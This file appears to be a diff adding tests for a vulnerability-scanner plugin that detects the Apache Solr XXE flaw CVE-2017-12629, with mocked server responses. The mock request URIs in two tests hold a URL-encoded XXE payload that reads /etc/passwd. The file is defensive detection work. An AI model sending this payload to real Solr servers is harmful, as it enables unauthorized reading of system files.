@@ -1,0 +1,74 @@
+# proto-file: proto/templated_plugin_tests.proto
+# proto-message: TemplatedPluginTests
+
+config: {
+  tested_plugin: "Apache_Solr_CVE_2017_12629"
+}
+
+########
+# TESTS #
+########
+
+tests: {
+  name: "whenVulnerable_returnsTrue"
+  expect_vulnerability: true
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "/solr/admin/info/system?wt=json"
+        status: 200
+        headers: [
+          { name: "Content-Type" value: "application/json" }
+        ]
+        body_content: "{\"responseHeader\":{\"status\":0},\"lucene\":{\"solr-spec-version\":\"6.6.0\"}}"
+      },
+      {
+        uri: "/solr/demo/select?wt=xml&defType=xmlparser&q=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%3C%21DOCTYPE+test+%5B%3C%21ENTITY+%25+xxe+SYSTEM+%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E+%25xxe%3B%5D%3Cg%3E%3C%2Fg%3E"
+        status: 400
+        headers: [
+          { name: "Content-Type" value: "application/xml" }
+        ]
+        body_content: "org.apache.solr.common.SolrException: systemId: file:///etc/passwd; line 1; column 1; org.xml.sax.SAXParseException"
+      }
+    ]
+  }
+}
+
+tests: {
+  name: "whenNotVulnerable_returnsFalse"
+  expect_vulnerability: false
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "/solr/admin/info/system?wt=json"
+        status: 200
+        headers: [
+          { name: "Content-Type" value: "application/json" }
+        ]
+        body_content: "{\"responseHeader\":{\"status\":0},\"lucene\":{\"solr-spec-version\":\"7.1.0\"}}"
+      },
+      {
+        uri: "/solr/demo/select?wt=xml&defType=xmlparser&q=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%3C%21DOCTYPE+test+%5B%3C%21ENTITY+%25+xxe+SYSTEM+%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E+%25xxe%3B%5D%3Cg%3E%3C%2Fg%3E"
+        status: 200
+        headers: [
+          { name: "Content-Type" value: "application/xml" }
+        ]
+        body_content: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><response><lst name=\"responseHeader\"><int name=\"status\">0</int></lst></response>"
+      }
+    ]
+  }
+}
+
+tests: {
+  name: "whenNotSolr_returnsFalse"
+  expect_vulnerability: false
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "TSUNAMI_MAGIC_ANY_URI"
+        status: 404
+        body_content: "<html><body>404 Not Found</body></html>"
+      }
+    ]
+  }
+}
